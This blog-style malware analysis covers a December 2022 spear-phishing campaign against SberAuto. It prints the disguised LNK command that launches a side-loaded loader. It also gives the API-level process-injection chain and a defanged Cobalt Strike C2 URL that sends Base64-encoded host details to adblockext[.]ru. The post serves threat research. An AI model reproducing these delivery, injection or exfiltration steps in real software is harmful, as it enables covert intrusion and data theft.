+++
date = "2023-01-01"
title = "The curious case of SberAuto spear-phishing campaign"
slug = "the-curious-case-of-sberauto-spear-phishing-campaign"
+++



### Summary
On December 19, 2022 malware researcher **StopMalvertisin** twitted a possible about a possible APT29 attack.

![Alt text](image-0.png)

The spear-phishing campaign targeted **SberAuto**, an online car trading platform in Russia associated with the state-owned banking and financial services company Sberbank.  
The analyzed attack displayed similar TTPs commonly attributed to **APT29** (aka **Cozy Bear**), even though it is unclear why a Russian-backed hacking group should be targeting a domestic web service.


## Technical Analysis
### Initial Stage
The first stage of this attack is represented by an **ISO** file (0b32bd907072d95223e5eb2dc5e3d9e0) named Алкоголь_2023_zip.iso (i.e., "Alcohol"), uploaded on VirusTotal on December 19, 2022 from **Russia** and potentially delivered as an email attachment.

![Alt text](image-1.png) 

The archive content closely resembles the one of previous APT29 campaigns.   

![Alt text](image-2.png)


The only folder visible item is a shortcut file disguised as Алкоголь_2023.pdf. 

```%windir%/system32/cmd.exe /c start update.exe & "%ProgramFiles(x86)%/Microsoft/Edge/Application/msedge.exe" %cd%/alcohol.pdf```

Once clicked on the **LNK** file, **update.exe** is firstly executed, followed by the lure PDF document called "alcohol.pdf", whose displays shows the alcohol catalog from the Russian chain called **Globus Gourmet**.   

![Alt text](image-3.png)

The files "thumbcache.dll" and "update.exe" are actually two legit *signed binaries* of **Microsoft OneDrive**: the latter exploits s**earch order hijacking** to load the malicious DLL named "version.dll," which has been modified by the threat actor to load an encrypted payload file.

![Alt text](image-4.png)


### Second stage: version.dll
The dynamic-linked library "version.dll"  is a 64-bit DLL side-loaded with the legit OneDrive updater binary.
The *compile-timestamp* shows **Sunday, December 18 2022**. 

![Alt text](image-5.png)


The presence of some strings hints that this program was created using **Shhhloader** framework, a "shellcode loader that takes raw shellcode as input and compiles a C++ stub that does a bunch of different things to try and bypass AV/EDR".  

![Alt text](image-6.png)

The binary first employs ```GetComputerNameExA``` API function to get the hostname of the infected machine and check whether it is equal to ```corp.sberauto[.]com```, an online russian service facilitating car sales website.
If the hostname does not match, the program terminates.

![Alt text](image-7.png)

After that, the malicious DLL iterates through the running processes using ```Process32Next``` to find the ID of **explorer.exe** and obtain its process handle.

![Alt text](image-8.png)

It then creates a *suspended-process* called **RuntimeBroker.exe** using ```CreateProcessA``` and sets **explorer.exe** as the parent process via ```UpdateProcThreadAttribute``` API.   

![Alt text](image-9.png)

Finally, it decrypts the shellcode into RuntimeBroker.exe through ```NtAllocateVirtualMemory``` and ```NtWriteVirtualMemory```, executing it through ```NtAlertResumeThread```.  

![Alt text](image-10.png)


### Final stage: Cobalt Strike
The final payload is a **Cobalt Strike Beacon** that, after obtaining the relevant information of the machine such as *username*, *computer name* and *computer version*, sends them to the **C2** ```adblockext[.]ru``` domain via  **Base64-encoded** scheme. 


```https://adblockext[.]ru/functionalStatus/hw7s8TE4f9GtrBHb8iiFT7RyIAuN?_=BASE64_ENCODED_DATA```


## Conclusion
The similarities with previous APT29 campaigns (i.e., the use of ISO files containing binaries vulnerable to DLL hijacking) may lead to a couple of final hypotheses.  
First, the attacks may be either orchestrated by Ukrainian groups (particularly, the "The IT Army of Ukraine") trying to simulate Cozy Bear TTPs.  
Alternately, this could be also a Russian red teaming exercise to enhance internal cybersecurity measures.






























